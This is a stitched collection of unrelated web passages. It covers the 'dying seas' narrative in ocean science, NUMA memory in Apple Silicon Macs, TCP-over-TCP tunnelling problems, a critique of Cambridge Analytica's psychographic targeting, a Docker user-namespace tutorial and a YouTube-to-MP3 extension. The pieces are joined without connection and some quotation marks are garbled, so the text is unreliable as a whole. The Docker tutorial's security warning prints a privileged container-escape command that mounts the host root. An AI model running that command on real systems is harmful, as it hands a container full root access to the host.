<p>Although hampering science communication, the dying-seas narrative may also contribute to misguided efforts at environmental restoration. In 2012 a native community on Haida Gwaii paid $2.5 million to an American entrepreneur to carry out an iron-seeding experiment off the coast of British Columbia. The goal was to dump iron dust into the sea to artificially trigger a plankton bloom and restore the local salmon population while also sequestering carbon dioxide. As mentioned earlier, oceanographers pioneered iron-seeding experiments but came to deem the method as too risky for practical use. The Haida Gwaii iron-seeding project was therefore condemned by the international scientific community as having violated two international agreements to place checks on unregulated geoengineering. Yet a lay public that was sold on <em>saving </em>a â€œdying seaâ€� triggered what many in the scientific community saw to be dangerous â€œrogue science.â€� Nor is the 2012 iron-seeding event the only scientifically questionable technological solution marketed as a solution for marine ecological crises. A far more ambitious engineering project to skim microplastics from the North Pacific sea surface is now being tested. The Ocean Cleanup project was founded by a teenage Dutch inventor who, after delivering a viral TEDx speech and raising $2.2 million in crowdsourced funding, dropped out of university to develop his project. Despite concerns voiced by oceanographers that the device will not only be ineffective but will harm pelagic marine creatures, the installation was deployed in late 2018.
On a much smaller scale, millions of dollars have been invested in engineering projects around the world in the Sisyphean task of trying to hold back rising seas as the Greenland and Antarctic ice sheets melt. It may be that future oceanographers, unlike their predecessors, will be less focused on encouragement of widespread collaborative observation and experimentation at sea and more concerned with oversight and restriction of interfering scientific and engineering practices.&nbsp;</p>
<p>Unsurprisingly, the projection of sentience onto the natural world fails to move climate change skeptics. Appeals to safeguard individual charismatic species, like the polar bear, risk critique as devaluing human existence in favor of other forms of life. Descriptions of the earth as a victim of human agency are dismissed by political opponents as scientific hubris. Even publics potentially receptive to conservation science risk being demoralized by imaginative invocation of a vast, â€œdyingâ€� non-human entity. The author of a 2014 editorial in <em>Smithsonian Magazine </em>notes, â€œWeâ€™ve gone from thinking the ocean was too big to hurt, to thinking that the ocean is too big and too sick to help.â€� This cognitive-emotional orientation has been unintentionally fostered by scientists intent on educating a lay public on the importance of global systems thinking. Yet the popularization of this approach to nature has its pitfalls. Conceptualizing the oceans as a cohesive nonhuman entity oversimplifies accounts of environmental degradation and limits understanding of local variability.&nbsp;</p>
<p>In 2013, Microsoft cofounder Paul Allen announced a contest called Ocean Challenge. The contest awarded â€œ$10,000 to the most promising new science-based concept for mitigating environmental and/or societal impacts of ocean acidification.â€� The winners of the contest were Ruth D. Gates of the University of Hawaii and Madeleine van Oppen of the Australian Institute of Marine Science. Their project to genetically select and cultivate corals that possess natural resistance to ocean acidification received funding. Coral reefs take up less than 1 percent of the earthâ€™s surface, yet they are habitats for an estimated one-third of all known marine creatures, including 25 percent of commercial seafood species. They also act as natural breakwaters, dampening the power of storm surges and coastal erosion. An estimated 61 percent of coral reefs are under stress and at risk of disappearing by 2030. Thus, the health of coral reefs is widely used as a metric for global ocean health, the marine equivalent of the canary in the coal mine. Gates, who passed away in October 2018, described herself as â€œa futurist.â€� â€œA lot of people want to go back to something. They think, If we just stop doing things, maybe the reef will come back to what it was,â€� she explained. In contrast, her project acknowledged a future â€œwhere nature is no longer fully natural.â€� In Gatesâ€™s understanding, the ocean isnâ€™t dead, but its survival hinges on assumption of responsibility for its now-hybrid character. Is there a cost to abandoning the nineteenth-century ideal of wilderness? Perhaps doing so is the price we must pay to retain a semblance of what once was.&nbsp;</p>

<p>Some theorists and scientists advocate greater inclusion of nonhuman actors in debates about ecological crisis. Bruno Latour, for example, argues that â€œa science of objects and politics of subjectsâ€� must be replaced by a â€œpolitical ecology of collectives consisting of humans and nonhumans.â€� A precedent has been set by the recent allocation of legal rights to rivers in Australia, New Zealand, and India. But although we must not shirk from placing value on nonhuman entities, in the end climate change—and by extension marine environmental degradation—remains a human problem, and we need to foreground human abilities to comprehend and solve it. As Jean-Michel Cousteau, son of Jacques, asserts, â€œThe face of our planet is the ocean. It is the largest ecosystem on our Earth. But the face of climate change is not the whale, the polar bear, the glacier, the rainforest or the desert. The face of climate change is us.â€�&nbsp;<br></p>
<p>The marine sciences, like all branches of scientific knowledge, are shaped by underlying assumptions about human relationship with the natural world. The tensions I have highlighted point to a crisis in scientific and lay imaginations of an ocean radically changed in the course of the Anthropocene. Scientists increasingly talk about the ocean as a hybrid environment. Gates was surely correct in asserting that scientific solutions for an ocean understood as dying can be reached only by acknowledging that the contemporary ocean cannot be conceived apart …</p></article></div>

		<p>The new <a href="https://www.macworld.co.uk/news/how-good-is-apples-m1-chip-really-3797893/">M1 chip in the new Macs</a> has 8-16GB of DRAM on the package, just like many mobile phones or single-board computers. But unlike many desktop, laptop or workstation computers (there are exceptions). In the first tranche of Macs using the chip, that’s all the addressable RAM they have (i.e. ignoring caches), just like many mobile phones or single-board computers. But what happens when they move the Apple Silicon chips up the scale, to computers like the iMac or Mac Pro?</p>
<p>It’s possible that these models would have a few GB of memory on-package <em>and</em> access to memory modules connected via a conventional controller, for example DDR4 RAM. They almost certainly would if you could deploy <em>multiple</em> M1 (or successor) packages on a single system. Such a Mac would be a non-uniform memory access architecture (NUMA), which (depending on how it’s configured) has implications for how software can be designed to best make use of the memory.</p>
<p>NUMA computing is of course not new. If you have a computer with a CPU and a discrete graphics processor, you have a NUMA computer: the GPU has access to RAM that the CPU doesn’t, and vice versa. Running GPU code involves copying data from CPU-memory to GPU-memory, doing GPU stuff, then copying the result from GPU-memory to CPU-memory.</p>
<p>A hypothetical NUMA-because-Apple-Silicon Mac would not be like that. The GPU shares access to the integrated RAM with the CPU, a little like an Amiga. The situation on Amiga was that there was “chip RAM” (which both the CPU and graphics and other peripheral chips could access), and “fast RAM” (only available to the CPU). The fast RAM was faster because the CPU didn’t have to wait for the coprocessors to use it, whereas they had to take turns accessing the chip RAM. Nonetheless, the CPU had access to all the RAM, and programmers had to tell `AllocMem` whether they wanted to use chip RAM, fast RAM, or didn’t care.</p>
<p>A NUMA Mac would not be like that, either. It would share the property that there’s a subset of the RAM available for sharing with the GPU, but this memory would be faster than the off-chip memory because of the closer integration and lack of (relatively) long communication bus. Apple has described the integrated RAM as “high bandwidth”, which probably means multiple access channels.</p>
<p>A better and more recently analogy to this setup is Intel’s discontinued supercomputer chip, <a href="https://www.anandtech.com/show/8217/intels-knights-landing-coprocessor-detailed">Knight’s Landing</a> (marketed as Xeon Phi). Like the M1, this chip has 16GB of on-die high bandwidth memory. Like my hypothetical Mac Pro, it can also access external memory modules. Unlike the M1, it has 64 or 72 identical cores rather than 4 big and 4 little cores.</p>
<p>There are three ways to configure a Xeon Phi computer. You can not use any external memory, and the CPU entirely uses its on-package RAM. You can use a cache mode, where the software only “sees” the external memory and the high-bandwidth RAM is used as a cache. Or you can go full NUMA, where programmers have to explicitly request memory in the high-bandwidth region to access it, like with the Amiga allocator.</p>
<p>People rarely go full NUMA. It’s hard to work out what split of allocations between the high-bandwidth and regular RAM yields best performance, so people tend to just run with cached mode and hope that’s faster than not having any on-package memory at all.</p>
<p>And that makes me think that a Mac would either not go full NUMA, or would not have public API for it. <em>Maybe</em> Apple would let the kernel and some OS processes have exclusive access to the on-package RAM, but even that seems overly complex (particularly where you have more than one M1 in a computer, so you need to specify core affinity for your memory allocations in addition to memory type). My guess is that an early workstation Mac with 16GB of M1 RAM and 64GB of DDR4 RAM would look like it has 64GB of RAM, with the on-package memory used for the GPU and as cache. NUMA APIs, if they come at all, would come later.</p>

November 13, 2020 | http://sites.inka.de/~bigred/devel/tcp-tcp.html | <a href="https://web.archive.org/web/*/http://sites.inka.de/~bigred/devel/tcp-tcp.html">archive.org</a>

    <p>
      A frequently occurring idea for IP tunneling applications is to
      run a protocol like PPP, which encapsulates IP packets in a
      format suited for a stream transport (like a modem line), over a
      TCP-based connection. This would be an easy solution for
      encrypting tunnels by running <em>PPP over SSH</em>, for which
      several recommendations already exist (one in the Linux HOWTO
      base, one on my own website, and surely several others). It
      would also be an easy way to compress arbitrary IP traffic,
      while datagram based compression has hard to overcome efficiency
      limits.
    </p><p>
      Unfortunately, it doesn't work well. Long delays and frequent
      connection aborts are to be expected. Here is why.

    </p><h2>TCP's retransmission algorithm</h2>
    <p>
      TCP divides the data stream into <em>segments</em> which are
      sent as individual IP datagrams. The segments carry a
      <em>sequence number</em> which numbers the bytes in the stream,
      and an <em>acknowledge number</em> which tells the other side
      the last received sequence number. [RFC793]
    </p><p>
      Since IP datagrams may be lost, duplicated or reordered, the
      sequence numbers are used to reassemble the stream. The
      acknowledge number tells the sender, indirectly, if a segment
      was lost: when an acknowledge for a recently sent segment does
      not arrive in a certain amount of time, the sender assumes a
      lost packet and re-sends that segment.
    </p><p>
      Many other protocols using a similar approach, designed mostly
      for use over lines with relatively fixed bandwidth, have the
      "certain amount of time" fixed or configurable. In the Internet
      however, parameters like bandwidth, delay and loss rate are
      vastly different from one connection to another and even
      changing over time on a single connection. A fixed timeout in
      the seconds range would be inappropriate on a fast LAN and
      likewise inappropriate on a congested international link. In
      fact, it would increase the congestion and lead to an effect
      known as "meltdown".
    </p><p>
      For this reason, TCP uses adaptive timeouts for all
      timing-related parameters. They start at conservative estimates
      and change dynamically with every received segment. The actual
      algorithms used are described in [RFC2001]. The details are not
      important here but one critical property: <em>when a segment
      timeouts, the following timeout is increased</em>
      (exponentially, in fact, because that has been shown to avoid
      the meltdown effect).

    </p><h2>Stacking TCPs</h2>
    <p>
      The TCP timeout policy works fine in the Internet over a vast
      range of different connection characteristics. Because TCP tries
      very hard not to break connections, the timeout can increase up
      to the range of several minutes. This is just what is sensible
      for unattended bulk data transfer. (For interactive
      applications, such slow connections are of course undesirable
      and likely the user will terminate them.)
    </p><p>
      This optimization for reliability breaks when stacking one TCP
      connection on top of another, which was never anticipated by the
      TCP designers. But it happens when running PPP over SSH or
      another TCP-based protocol, because the PPP-encapsulated
      IP datagrams likely carry TCP-based payload, like this:
    </p><p>
      <img src="http://sites.inka.de/~bigred/devel/tcp-tcp.png" width="371" height="270" alt="(TCP over IP over PPP over SSH over TCP over IP)">
    </p><p>
      Note that the upper and the lower layer TCP have different
      timers. When an upper layer connection starts fast, its timers
      are fast too. Now it can happen that the lower connection has
      slower timers, perhaps as a leftover from a period with a
      slow or unreliable base connection.
    </p><p>
      Imagine what happens when, in this situation, the base
      connection starts losing packets. The lower layer TCP queues up
      a retransmission and increases its timeouts. Since the
      connection is blocked for this amount of time, the upper layer
      (i.e. payload) TCP won't get a timely ACK, and will also queue a
      retransmission. Because the timeout is still less than the lower
      layer timeout, <em>the upper layer will queue up more
      retransmissions faster than the lower layer can process
      them</em>. This makes the upper layer connection stall very
      quickly and every retransmission just adds to the problem - an
      internal meltdown effect.
    </p><p>
      TCPs reliability provisions backfire here. The upper layer
      retransmissions are completely unnecessary, since the carrier
      guarantees delivery - but the upper layer TCP can't know this,
      because TCP always assumes an unreliable carrier.

    </p><h2>Practical experience</h2>
    <p>
      The whole problem was the original incentive to start the <a href="http://sites.inka.de/~bigred/devel/cipe.html">CIPE</a>
      project, because I used a PPP over SSH solution for some time
      and it proved to be fairly unusable. At that time it had to run
      over an optical link which suffered frequent packet loss,
      sometimes 10-20% over an extended period of time. With plain
      TCP, this was just bearable (because the link was not
      congested), but with the stacked protocols, connections would
      get really slow and then break very frequently.

    </p><p>
      This is the detailed reason why CIPE uses a datagram carrier.
      (The choice for UDP, instead of another IP-level protocol like
      IPsec does, is for several reasons: this allows to distinguish
      tunnels by their port number, and it adds the ability to run
      over SOCKS.) The datagram carrier has exactly the same
      characteristics as plain IP, for which TCP was designed to run
      over.

    </span></p><p>I am writing this to share my conclusions regarding the Cambridge Analytica affair. I have a somewhat unique perspective on the topic for three reasons:</p>

<ul>
<li>My day job consists of measuring the effectiveness of digital advertising.</li>
<li>I have first hand experience with the technology and methods that Cambridge Analytica claims to have used.</li>
<li>I played a small role in unearthing the Cambridge Analytica scandal.</li>
</ul>

<h2 id="what-cambridge-analytica-supposedly-did">What Cambridge Analytica supposedly did</h2>

<p>The New Statesmen’s Laurie Clarke puts it in the <a href="https://www.newstatesman.com/science-tech/social-media/2020/10/how-cambridge-analytica-scandal-unravelled">following way</a>:</p>

<blockquote>
<p>CA was alleged to have mined Facebook data from millions of people worldwide. The data was detailed enough for CA to create complex psychographic profiles of its subjects, to deliver pinpointed adverts to them and propel them into new behaviour patterns. The CA whistleblower Christopher Wylie described it as “Steve Bannon’s psychological warfare mind-fuck tool”. </p>
</blockquote>

<p>In the Netflix documentary <em>The Great Hack</em> Brittany Kaiser, the former business development executive of Cambridge Analytica says:</p>

<blockquote>
<p>“If we targeted enough persuadable people in the right precincts, then those states would turn red instead of blue… We bombarded them through blogs, websites, articles, videos on every platform you can imagine until they saw the world the way we wanted them to – until they voted for our candidate.”</p>
</blockquote>

<p>The implication here being that two of the greates political upsets of the last decade (Brexit &amp; Trump) were due to the advanced persuasion technology that Cambridge Analytica sold to the highest bidder.</p>

<p>My concern is that a lot of people seem to focus on a scary technology called psychographic advertising (also known as psychographic or&nbsp;<a href="https://hbr.org/2018/05/what-marketers-should-know-about-personality-based-marketing">personality marketing</a>) that purportedly allowed Cambridge Analytica to manipulate people by serving them ads tailored to their individual personality. My argument is that this technology is mostly ineffective in the context of modern digital advertising and is unlikely to have had the influence attributed to it. Moreover, it distracts from the true issues at stake, such as data privacy in the days of “<a href="https://www.theguardian.com/technology/2019/jan/20/shoshana-zuboff-age-of-surveillance-capitalism-google-facebook">surveillance capitalism</a>”.</p>

<h2 id="my-role-in-the-story">My role in the story</h2>

<p>Between 2012 and 2014 I did some work at the Cambridge University Psychometric Centre in as an undergraduate, and I met in person Alex Kogan and a lot of the people who were mentioned in the&nbsp;<a href="https://www.michalkosinski.com/clown-show">books</a>&nbsp;and&nbsp;<a href="https://www.nytimes.com/2018/03/17/us/politics/cambridge-analytica-trump-campaign.html">articles</a>&nbsp;that have been written about the whole scandal. While at Cambridge I had access to key parts of the data set that inspired Cambridge Analytica’s work.</p>

<p>In 2015 I spent some time at Stanford, where I recruited several well-known brands (who I presume would rather not be named) to test psychographic marketing in a commercial setting. While doing my research on psychographic marketing, I discovered that a little known company called Cambridge Analytica was working with Ted Cruz on psychometric targeting in digital advertising.</p>

<p>I pointed this out to&nbsp;<a href="https://www.michalkosinski.com/">Dr Michal Kosinski</a>, who was familiar with the unethical way in which the Cambridge Analytica had collected its data. Michal then got in touch with a journalist at the Guardian, who produced the&nbsp;<a href="https://www.theguardian.com/us-news/2015/dec/11/senator-ted-cruz-president-campaign-facebook-user-data">first article</a>&nbsp;in what later became known as the Cambridge Analytica scandal in December 2015.</p>

<p>Eventually I failed to get psychographic advertising to work for commercial purposes in 2015 and moved on to other projects. Since then, I’ve also spoken to other teams that spent years trying to get a commercially viable personality marketing to work, who also failed. As far as I know, Facebook also ran some tests internally and decided not to proceed with it in early 2015. From this I drew the conclusion was that psychographic marketing doesn’t&nbsp;<strong>really</strong>&nbsp;work, particularly not in the way Cambridge Analytica claimed it did. Let me illustrate why by looking at one of the key scientific papers on personality marketing.</p>

<h2 id="what-the-science-says">What the science says</h2>

<p>This&nbsp;<a href="https://www.pnas.org/content/114/48/12714/">paper</a>&nbsp;was written by Sandra Matz and friends. The experiments they describe are clever: studies 1 and 2 show that you can target high individuals who score highly along a certain personality dimension (say, are extroverted), and that these individuals respond better to messages crafted for their end of the dimension than the opposite dimension (e.g. highly extroverted people respond better to high extroversion crafted messages than low extroversion messages). In study 3, they show that a psychologically targeted message towards introverts performed better than the copy used by a company previously.</p>

<p>This study is important in that it demonstrates three things:</p>

<ul>
<li>It is possible to target people online based on their personality</li>
<li>It is possible to tailor messages to people online based on their personality, and these messages perform better than those tailored for people with an opposite personality.</li>
</ul>

<p>What Sandra’s paper does not show, is that psychographic advertising performs better than standard methods used in digital advertising. In my experience it does not, and I can explain why.</p>

<p>Personality based advertising is based on a simple five dimensional model of human beings, designed to explain behaviours as diverse as reading books and going to clubs. Facebooks machine learning algorithms create a high dimensional model finely tuned with thousands of data points trying to optimise for very specific outcomes, such as purchasing a MAGA hat. The former is a general descriptive model built using statistical methods of the mid 20th century, with some but overall limited predictive general validity. The latter is a highly specialised machine learning model, with little descriptive power, but lot more accurate at predicting specific behaviours like the purchases of haircuts.</p>

<h2 id="digital-advertising-in-practice">Digital advertising in practice</h2>

<p>Keeping that in mind, which of these two digital approaches do you think will yield better results?</p>

<ul>
<li>Approach A: Summon the best psychologists and copywriters in the world to write copy that will get extroverted people to purchase a brand of deodorant. Target highly extroverted people on Facebook with that copy by advertising to people who have “liked” highly extroverted pages.</li>
<li>Approach B: Using Facebook’s machine learning algorithms generate a Lookalike audience based on previous purchasers on your site. Target these people with thousands of different types of programmatically generated messages, and focus on the better performing ones.</li>
</ul>

<p>When I researched this in 2015 I found that Approach B will perform better at all times. In fact, Approach B is more like what Trump&nbsp;<a href="https://www.theatlantic.com/technology/archive/2020/04/how-facebooks-ad-technology-helps-trump-win/606403/">actually did in 2016</a>:</p>

<p><em>“During the 2016 election cycle, Trump’s team ran 5.9 million ads on Facebook, spending $44 million from June to November alone. Hillary Clinton’s campaign ran only 66,000.”</em></p>

<p>Instead of trying a fancy secret sauce on how to design creatives and how to target them Trump’s team just threw everything at the algorithm and stuck with the ads that performed the best. All the psychological theory in the world has limited efficiency compared to the AI powering Facebook’s ad optimisations.</p>

<h2 id="so-what-do-i-think">So what do I think?</h2>

<p>In conclusion, it is not that psychographic advertising doesn’t work at all. The science behind it is solid, and it is worthy of study. My point is that psychographic advertising afforded Cambridge Analytica little to no advantage at all. Cambridge Analytica was working with more or less the same technology as their competitors. Most of the outlandish claims made by Cambridge Analytica were just branding, and subsequently sensationalism by reporting journalists. These are not just my conclusions by the way, they are also the findings of the&nbsp;<a href="https://ico.org.uk/media/action-weve-taken/2618383/20201002_ico-o-ed-l-rtl-0181_to-julian-knight-mp.pdf">British Information Commissioner’s Office</a>&nbsp;(excellent summary&nbsp;<a href="https://twitter.com/nickconfessore/status/1313853996168351747">here</a>). The “secret sauce” part of this affair should not distract from the wide scale data harvesting of large tech monopolies and the data privacy issues that arise from it.</p>

<!-- /.post-info -->      
<p>Not long ago, I publish <a href="https://www.jujens.eu/posts/en/2017/Feb/15/docker-unix-socket/">an article</a> about using Unix sockets with docker. These sockets where in docker volumes so they could be shared between various containers. The key idea was to change the UID and GID of the user that owns the socket in the container so they match those of the user that built the image. The main issue with this approach is that it requires you to build to container with the user that will run it. This makes the solution not portable.</p>
<p>Hopefully, the Linux kernel allows us to use an alternative to map user id inside the container to a predictable user id outside: user id namespaces. According to <a href="https://en.wikipedia.org/wiki/Linux_namespaces">wikipedia</a>: <cite>Namespaces are a feature of the Linux kernel that isolates and virtualizes system resources of a collection of processes. Examples of resources that can be virtualized include process IDs, hostnames, user IDs, network access, interprocess communication, and filesystems. Namespaces are a fundamental aspect of containers on Linux.</cite></p>
<p>For instance, thanks to the PID namespace, a process run inside a container can "think" it has the PID 1 inside a container while in fact it has another one. The same is true with user namespace: a user can "think" it has the 0 uid (root) while it fact it has the 1000 user id (some standard user). This will allow us to be sure for the files in a docker volumes that:</p>
<ul>
<li>All files belonging to the root user in the container will belong to a user of the system that is not root in the host.</li>
<li>All files belonging to other users in the container will be mapped to predictable uid (more on that latter).</li>
</ul>
<div id="configure-docker">
<h2><a href="#id1">Configure docker</a></h2>
<p>Lets configure docker to do all that.</p>
<p>First we either need to start the docker daemon with the <tt><span>--userns-remap</span> USER</tt> flag or make sure the configuration file of the docker daemon (<tt>/etc/docker/daemon.json</tt>) contains something like:</p>
<pre><span>{</span>
  <span>"userns-remap"</span><span>:</span> <span>"USER"</span>
<span>}</span>
</pre>
<p><strong>Notes:</strong></p>
<ol>
<li>In both cases, <tt>USER</tt> must be a valid user of the system (ie present in <tt>/etc/passwd</tt>).</li>
<li>Don't forget to restart the daemon if you have to edit the file.</li>
</ol>
</div>
<div id="configure-the-subordinate-uid-gid">
<h2><a href="#id2">Configure the subordinate uid/gid</a></h2>
<p><a href="http://man7.org/linux/man-pages/man5/subuid.5.html">subuid</a> and <a href="http://man7.org/linux/man-pages/man5/subgid.5.html">subgid</a> are used to specify the user/group ids an ordinary user can use to configure id mapping in a user namespace. They are written like: <tt>username:id:count</tt>. For instance, with <tt>jenselme:100000:65536</tt> it means that user <tt>jenselme</tt> can use 65536 user ids starting at 100000.</p>
<p>This will be used by docker to properly remap uid in the container to the host. For instance, with <tt>jenselme:100000:65536</tt>, a file with a uid of 33 in the container, will be a file with a uid of 100032 in the host. And you will have access to that file. Neat, isn't it?</p>
<p>Now that we've seen the theory, let's configure them properly. First, edit <tt>/etc/subuid</tt> and add (replace <tt>jenselme</tt> by your own user name):</p>
<pre>jenselme:1000:1
jenselme:100000:65536
</pre>
<p>You should be able to understand the second line. The first one is there for a slightly different purpose: make sure that all files created by root belong to the user with uid 1000. That's me on my machine, you should of course use your uid (you can get it with <tt>id <span>-u</span> USER</tt>). Otherwise, they will belong to uid 100000.</p>
<p>Now, edit <tt>/etc/subgid</tt> and add (replace <tt>jenselme</tt> by your own user name):</p>
<pre>jenselme:982:1
jenselme:100000:65536
</pre>
<p>The second line is the name in both cases. I didn't use <tt>jenselme:1000:1</tt> but <tt>jenselme:982:1</tt>. On my machine, 982 is the gui of the docker group (you can get it with <tt>getent group docker</tt>). This means that all files created by root, will belong to me and to the docker group. This "trick" can be handy if for some reason you need to share files with the docker daemon. For instance, software like <a href="https://traefik.io/">traefic</a> may need to read/write to the docker socket. By default, for this socket we have:</p>
<pre>[root@fastolfe ~]# ll /var/run/docker.sock
srw-rw----. 1 root docker 0 Jun 11 18:18 /var/run/docker.sock
</pre>
<p>This means that if in the outside the container the uid of root and its guid are mapped to those of jenselme, traefic won't be able to communicate with the socket because of the permissions of the file. Map the gid of root in the container to the gid of docker in the host allows us to prevent that issue.</p>
<p><strong>Note on security:</strong> Giving access to the docker socket is a problem from a security standpoint since it allows a container to create new containers thus giving it access to the whole host system <em>with root permissions</em>, eg by running <tt>docker run <span>-it</span> <span>-v</span> <span>--privileged</span> <span>-v</span> <span>/:/host</span> <span>--userns=host</span> fedora chroot /host</tt>. That is why SELinux will prevent the docker socket to be mounted in a volume by default. You should be aware of that when you do this. See <a href="http://danwalsh.livejournal.com/74095.html">this</a> for more on that topic.</p>
</div>
<div id="tests">
<h2><a href="#id3">Tests</a></h2>
<p>Now that we are all set, let's start the docker daemon (or restart it).</p>
<p><strong>Note to SELinux users:</strong> You need to append <tt>Z</tt> (capital z) when mounting the volumes, like this: <tt><span>-v</span> <span>$(pwd)/test:/test/:Z</span></tt>. Otherwise, the SELinux context will not be correct and you won't be able to access the volumes from the container. See <a href="https://www.jujens.eu/posts/2015/May/24/docker/#volumes">this docker tip</a>.</p>
<p>The first thing you should notice is that if you had downloaded images or created containers, you will not see them with <tt>docker images</tt> or <tt>docker ps <span>-a</span></tt>. That's because, when user re-mapping is enabled, all images and containers are located in a dedicated subfolder. On my machine, that is <tt>/var/lib/docker/1000.982</tt>.</p>
<p>Now that we know this is expected, let's try things. Run somewhere:</p>
<pre>docker run -it -v "$(pwd)/test:/test/" nginx /bin/bash
</pre>
<p>This will open a bash prompt as root in the container. Go to the volume with <tt>cd /test</tt> and create a file: <tt>touch rootfile</tt>. If you run a <tt>ls <span>-l</span></tt> inside the container, you should see something like:</p>
<pre>root@02a5bcc1757c:/test# ls -l
total 0
-rw-r--r--. 1 root   root 0 Jun 11 16:25 rootfile
</pre>
<p>Let's check the uid and gid to be sure:</p>
<pre>root@02a5bcc1757c:/test# ls -ln
total 0
-rw-r--r--. 1 0 0 0 Jun 11 16:25 rootfile
</pre>
<p>So the file belongs to root and its uid is 0 as well as its gid.</p>
<p>Now run <tt>ls <span>-l</span></tt> in the host:</p>
<pre>▶ ls -l
total 0
-rw-r--r--. 1 jenselme docker 0 Jun 11 18:25 rootfile
</pre>
<p>Let's check the uid and guid:</p>
<pre>▶ ls -ln
total 0
-rw-r--r--. 1   1000 982 0 Jun 11 18:25 rootfile
</pre>
<p>That's correct. Now let's do the same thing wit the <tt><span>www-data</span></tt> user. First, let's give some permissions on the <tt>/test</tt> folder to the <tt><span>www-data</span></tt> user. Since this is just a test, let's run <tt>chmod 777 /test</tt>. Now, switch to this user with <tt>su <span>-s</span> /bin/bash <span>www-data</span></tt>. You should now be in the <tt>/test</tt> directory connected as <tt><span>www-data</span></tt>. Create a file with <tt>touch <span>www-data-file</span></tt>. You should see something like:</p>
<pre>www-data@02a5bcc1757c:/test$ ls -l
total 0
-rw-r--r--. 1 root     root     0 Jun 11 16:36 rootfile
-rw-r--r--. 1 www-data www-data 0 Jun 11 16:38 www-data-file
</pre>
<p>And:</p>
<pre>www-data@02a5bcc1757c:/test$ ls -ln
total 0
-rw-r--r--. 1  0  0 0 Jun 11 16:36 rootfile
-rw-r--r--. 1 33 33 0 Jun 11 16:38 www-data-file
</pre>
<p>As far as the host is concerned, we have:</p>
<pre>▶ ls -l
total 0
-rw-r--r--. 1 jenselme docker 0 Jun 11 18:36 rootfile
-rw-r--r--. 1   100032 100032 0 Jun 11 18:38 www-data-file
</pre>
<p>And</p>
<pre>▶ ls -ln
total 0
-rw-r--r--. 1   1000    982 0 Jun 11 18:36 rootfile
-rw-r--r--. 1 100032 100032 0 Jun 11 18:38 www-data-file
</pre>
<p>Now let's create some files from the host. For instance, let's do <tt>touch <span>www-data-file-from-host</span></tt>. In the host it currently belongs to the current user. Let's see in the container:</p>
<pre>www-data@02a5bcc1757c:/test$ ls -l
total 0
-rw-r--r--. 1 root     root     0 Jun 11 16:36 rootfile
-rw-r--r--. 1 www-data www-data 0 Jun 11 16:38 www-data-file
-rw-r--r--. 1 root     nogroup  0 Jun 11 16:41 www-data-file-from-host
</pre>
<p>It belongs to <tt>root</tt> and <tt>nogroup</tt> as expected (in the host, the file belongs to <tt>jenselme:jenselme</tt> not <tt>jenselme:docker</tt>, hence the <tt>nogroup</tt>, I could run <tt>chown jenselme:docker <span>www-data-file-from-host</span></tt> to fix the gid). If you check the uid and gid, you will see it is also as expected.</p>
<p>Now let's change the owner of <tt><span>www-data-file-from-host</span></tt> to <tt>100032:100032</tt> with <tt>chown 100032:100032 <span>www-data-file-from-host</span></tt> (this must be run as root to prevent an <em>Operation not permitted</em>). I let you check the owner, uid, gid in the container. You can also check that the <tt><span>www-data</span></tt> user can write in the file with <tt>echo 'test' &gt; <span>www-data-file-from-host</span></tt>.</p>
<p>This looks good isn't it? I found however one dark spot in this. If you try to edit <tt><span>www-data-file-from-host</span></tt> or <tt><span>www-data-file</span></tt> in the host, it will fail with <em>permission denied</em>. As far as I understand the subuid and subgid, this is not normal. If someone has an explanation for this, please leave a comment. I see two workarounds for that:</p>
<ol>
<li><p>The basic:</p>
<blockquote>
<ol>
<li>Create a group with id <tt>100032</tt> (as root): <tt>groupadd <span>-g</span> 100032 <span>docker-www-data</span></tt></li>
<li>Add yourself to this group (as root): <tt>usermod <span>-aG</span> <span>docker-www-data</span> jenselme</tt></li>
<li>Disconnect/reconnect or use the <tt>newgrp <span>docker-www-data</span></tt> command to take this change into account.</li>
<li>Give write permission to the group in the container: <tt>chmod g=rw <span>www-data-file</span></tt></li>
<li>Write in the file.</li>
</ol>
<p><strong>Note:</strong> You cannot do anything about the user since you can only have one user id.</p>
</blockquote>
</li>
<li><p>The elegant: use ACL (Access Control List). See the <a href="#external-links">external links</a> section to learn more about ACL. TL;DR, ACLs are a way to extend the standard permissions of the filesystem. With them, you can set permissions for a file or directory with very thin granularity for each users and groups of the system. To enable ACLs, run as root:</p>
<blockquote>
<ol>
<li><p><tt>setfacl <span>-Rdm</span> u:USER:rwX DIR</tt> (replace <tt>USER</tt> by a username and <tt>DIR</tt> by a path to a directory or file). This will:</p>
<blockquote>
<ul>
<li><tt><span>-R</span></tt> recurse on subfolders.</li>
<li><tt><span>-d</span></tt> default to this rule. This means that the ACL will apply to all files and directories created in <tt>DIR</tt> after the <tt>setfacl</tt> was run.</li>
<li><tt><span>-m</span></tt> modify the rule to <tt>u:USER:rwX</tt> that is give to the user (<tt>u:</tt>) <tt>USER</tt> the permissions <tt>rwX</tt>. The capital <tt>X</tt> means <em>give execution permission to all folders and to files that have the execute permissions</em>. This prevent us to make all files executable.</li>
<li>apply to <tt>DIR</tt></li>
</ul>
</blockquote>
</li>
<li><p><tt>setfacl <span>-Rm</span> u:USER:rwX DIR</tt> (replace <tt>USER</tt> by a username and <tt>DIR</tt> by a path to a directory or file). This will apply the ACL rule on the existing files in <tt>DIR</tt>.</p>
</li>
</ol>
</blockquote>

      <p>
        A server-less chrome extension to convert youtube videos to mp3 files for download. If available, files are persisted to <a href="https://siasky.net/">Sia SkyNet</a> for future downloads by all users.
      </p>
      <p>This Youtube to MP3 chrome extension is different in a few ways:
        </p><ol>
          <li>The conversion takes place on your machine, not a server, so there's no server costs we need to cover with ads</li>
          <li>The conversion logic exists on your machine, and is resilliant to takedowns</li>
          <li>Your conversions are cached with <a href="https://siasky.net/">Sia SkyNet</a> for quick download without conversion in the future by everyone</li>
          <li>This extension <a href="https://github.com/benkaiser/youtube-to-mp3">is open source</a> and available for you to inspect the integrity of it yourself</li>
        </ol>

      <h2>Usage</h2>
      <div>
        <div>
        <p>
          Just navigate to any youtube video and click the "Download MP3" button next to the Subscribe button.
        </p>
        <p>
          If the file has not yet been converted, your machine will download the youtube video and convert it to an mp3. This process may take 30+ seconds depending on video size, your internet connection and your computers processing power. Once the file is converted a download will trigger on your browser for the file.
        </p>
        <p>
          If someone has previously converted the video to mp3 using the extension already, the download will start in just a few seconds.

    <p>The other day, it “clicked” for me: I think I understand better now what schools are really for.</p>

